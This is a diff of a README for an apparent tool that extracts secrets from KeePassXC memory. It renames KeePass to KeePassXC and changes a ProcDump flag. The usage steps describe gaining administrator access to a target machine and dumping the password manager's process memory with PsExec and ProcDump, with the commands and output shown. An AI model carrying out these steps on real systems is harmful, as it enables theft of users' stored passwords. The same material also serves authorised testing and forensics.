@@ -10,9 +10,9 @@ python3 -m pip install -r requirements.txt
 
 ## Usage
 
-1. Gain access to the target machine running KeePass as local administrator.
+1. Gain access to the target machine running KeePassXC as local administrator.
 
-2. Perform a process dump from the running KeePass process (I typically go with [PsExec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec) + [ProcDump](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump))
+2. Perform a process dump from the running KeePassXC process (I typically go with [PsExec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec) + [ProcDump](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump))
 
    ```
    PS C:\Windows\Temp> Get-Process keepassxc                                                                                                                                                                                                       
@@ -20,7 +20,7 @@ python3 -m pip install -r requirements.txt
    -------  ------    -----      -----     ------     --  -- -----------
        358      33    36508       1396       3.22    988   1   KeePassXC                                                   
        
-   PS C:\Windows\Temp> .\procdump.exe -accepteula -ma 988 keepassxc.dmp
+   PS C:\Windows\Temp> .\procdump.exe -accepteula -mm 988 keepassxc.dmp
    
    ProcDump v11.0 - Sysinternals process dump utility
    Copyright (C) 2009-2022 Mark Russinovich and Andrew Richards
